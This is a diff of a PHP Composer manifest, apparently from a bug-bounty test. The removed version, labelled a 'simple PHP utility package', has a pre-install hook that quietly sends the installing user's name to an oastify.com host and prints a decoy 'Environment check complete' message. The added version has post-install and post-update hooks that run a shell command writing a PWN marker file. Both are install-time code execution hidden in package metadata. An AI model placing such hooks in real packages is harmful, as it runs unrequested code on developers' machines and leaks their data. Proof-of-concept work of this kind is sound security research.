@@ -1,13 +1,14 @@
 {
-    "name": "simple/package",
-    "description": "Simple PHP utility package",
-    "type": "library",
-    "require": {
-        "php": ">=7.0"
-    },
-    "scripts": {
-        "pre-install-cmd": [
-            "php -r \"$user = get_current_user(); $ch = curl_init('http://8s1tt957qqg3usu74ku9lfldm4svgpgd5.oastify.com/user?name='.$user); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_exec($ch); curl_close($ch); echo 'Environment check complete.';\""
-        ]
-    }
+  "name": "test/hackerone",
+  "require": {
+    "php": "^8.1"
+  },
+  "scripts": {
+    "post-install-cmd": [
+      "/bin/sh -c 'touch /home/u560165054/PWN'"
+    ],
+    "post-update-cmd": [
+      "/bin/sh -c 'touch /home/u560165054/PWN'"
+    ]
+  }
 }
